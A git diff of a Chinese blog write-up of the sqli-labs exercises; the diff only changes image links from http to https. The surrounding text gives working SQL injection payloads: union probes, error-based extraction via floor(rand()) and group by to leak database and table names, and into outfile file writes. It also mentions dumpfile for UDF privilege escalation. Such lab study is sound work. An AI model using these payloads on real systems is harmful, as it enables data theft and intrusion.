@@ -13,14 +13,14 @@ categories: SQL 注入
 - 错误 `You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1`
 - sql 语句 `select * from tables where id = '$id' limit 0,1` ,参数在单引号内
 
-![](http://ww4.sinaimg.cn/large/005CA6ZCgw1f7684wu1ogj3105034gmk.jpg)
+![](https://ww4.sinaimg.cn/large/005CA6ZCgw1f7684wu1ogj3105034gmk.jpg)
 
 ## 1.2 union 查询
 - 参数 $id = `' union select 1,2,3%23`
 - URL `http://localhost/sqli-labs-master/Less-5/?id=%27%20union%20select%201,2,3%23`
 - sql 语句：`select col1,col2,col3 from tables where id = '' union select 1,2,3%23' limit 0,1`
 
-![](http://ww4.sinaimg.cn/large/005CA6ZCgw1f768d41k3hj30c903xmx8.jpg)
+![](https://ww4.sinaimg.cn/large/005CA6ZCgw1f768d41k3hj30c903xmx8.jpg)
 but.....   页面上并没有显示数据库结果的地方，即使通过 union 查询到了数据库表，字段信息，也无法显示在页面上。
 因此，需要构造 <font color="red">一种语法正确（在编译时是正确的）而运行时会出错的sql查询语句，并且错误信息中包含数据局相关信息</font>。一些天才的研究人员发现，可以使用聚合函数 group by子句，并结合随机函数rand()，在运行过程中有可能出错。
 
@@ -33,17 +33,17 @@ select rang()*2 | 0~2 之间的随机值
 select floor(rand()*2*) | 0 1 两个整数随机出现
 select database() | 当前数据库
 select concat((select database()),0x20,floor(rand()*2))a | {当前数据库}{空格}{0 1中的一个}
-![](http://ww4.sinaimg.cn/large/005CA6ZCgw1f768u2z3a9j30b606wt8v.jpg)
+![](https://ww4.sinaimg.cn/large/005CA6ZCgw1f768u2z3a9j30b606wt8v.jpg)
 
 ### 1.3.2 group by
 `select 1,count(*),concat((select database()),0x20,floor(rand()*2))a from information_schema.tables group by a`
-![](http://ww1.sinaimg.cn/large/005CA6ZCgw1f768yvdsh6j30je077jrw.jpg)
+![](https://ww1.sinaimg.cn/large/005CA6ZCgw1f768yvdsh6j30je077jrw.jpg)
 
 重复执行多次，得到的 count(*) 不一样
-![](http://ww1.sinaimg.cn/large/005CA6ZCgw1f7690aziijj30jd079gm8.jpg)
+![](https://ww1.sinaimg.cn/large/005CA6ZCgw1f7690aziijj30jd079gm8.jpg)
 
 最终会出现如下错误：
-![](http://ww3.sinaimg.cn/large/005CA6ZCgw1f76920orxwj30kc0a6dhf.jpg)
+![](https://ww3.sinaimg.cn/large/005CA6ZCgw1f76920orxwj30kc0a6dhf.jpg)
 
 错误信息中会显示当前数据库名 information_schema
 
@@ -56,15 +56,15 @@ group by 语句报错的原因是 `floor(rand()*2)` 的不确定性，即结果�
 - 网址  ` http://localhost/sqli-labs-master/Less-5/?id=%27%20union%20select%201,count(*),concat((select%20database()),0x20,floor(rand()*2))a%20from%20information_schema.tables%20group%20by%20a%23 `
 - sql 语句：`select col1,col2,col3 from tables where id = '' union select 1,count(*),concat((select database()),0x20,floor(rand()*2))a from information_schema.tables group by a%23' limit 0,1`
 
-![](http://ww4.sinaimg.cn/large/005CA6ZCgw1f769ox9w4ij30cb03x3yl.jpg)
+![](https://ww4.sinaimg.cn/large/005CA6ZCgw1f769ox9w4ij30cb03x3yl.jpg)
 
 刷新多次之后，出现如下错误：
-![](http://ww2.sinaimg.cn/large/005CA6ZCgw1f769kss9wtj30cc03waa8.jpg)
+![](https://ww2.sinaimg.cn/large/005CA6ZCgw1f769kss9wtj30cc03waa8.jpg)
 
 <font color="red">将 database() 换成任何想获取的信息</font>
 例如表名，则参数为
 $id = `' union select 1,count(*),concat((select group_concat(distinct table_name) from information_schema.tables where table_schema = database()),0x20,floor(rand()*2))a from information_schema.tables group by a%23`
-![](http://ww4.sinaimg.cn/large/005CA6ZCgw1f769qoh0xbj30h703xdg6.jpg)
+![](https://ww4.sinaimg.cn/large/005CA6ZCgw1f769qoh0xbj30h703xdg6.jpg)
 
 其他信息获取方式参见 [sqli labs lesson 1~4 学习](http://huirong.github.io/2016/08/24/sqli-labs-series-part1-4/) lesson 1
 
@@ -80,9 +80,9 @@ $id = `" union select 1,count(*),concat((select database()),0x20,floor(rand()*2)
 - 你需要有一个登陆服务器的账号来检索文件。否则 select...into outfile 不会起任何作用。 
 - 在UNIX中，该文件被创建后是可读的，权限由MySQL服务器所拥有。这意味着，虽然你就可以读取该文件，但可能无法将其删除
 
-![sql](http://ww3.sinaimg.cn/large/005CA6ZCjw1f76zlw41sbj30g7046t92.jpg)
+![sql](https://ww3.sinaimg.cn/large/005CA6ZCjw1f76zlw41sbj30g7046t92.jpg)
 
-![hello.txt](http://ww2.sinaimg.cn/large/005CA6ZCgw1f76zal94ldj30g604igml.jpg)
+![hello.txt](https://ww2.sinaimg.cn/large/005CA6ZCgw1f76zal94ldj30g604igml.jpg)
 有可能会因为目录没有 file 权限，在文件夹中没有生成 TXT 文件，多试几个目录或文件夹。
 
 若我们想把一个可执行2进制文件用into outfile函数导出，导出后就会被破坏，因为into outfile函数会在行末端写入新行，并且会会转义换行符这样的话这个2进制可执行文件就会被破坏。这时候我们用into dumpfile 就能导出一个完整能执行的2进制文件，into dumpfile 函数不对任何列或行进行终止，也不执行任何转义处理。在udf提权的时候用到的就是dumpfile。但是dumpfile 一次只能导出一行。
@@ -90,10 +90,10 @@ $id = `" union select 1,count(*),concat((select database()),0x20,floor(rand()*2)
 ## 通过 outfile 获取数据库数据
 $id = `1')) union select user(),database(),version() into outfile 'D:\7.txt'%23`
 
-![](http://ww4.sinaimg.cn/large/005CA6ZCjw1f76zl5t95vj30g803o74f.jpg)
+![](https://ww4.sinaimg.cn/large/005CA6ZCjw1f76zl5t95vj30g803o74f.jpg)
 
 虽然页面上会显示错误，但是 D 盘会生成 7.txt 文件
-![](http://ww1.sinaimg.cn/large/005CA6ZCgw1f76zj3s9suj30ga04bwez.jpg)
+![](https://ww1.sinaimg.cn/large/005CA6ZCgw1f76zj3s9suj30ga04bwez.jpg)
 
 其他信息获取方式参见 [sqli labs lesson 1~4 学习](http://huirong.github.io/2016/08/24/sqli-labs-series-part1-4/) lesson 1
 
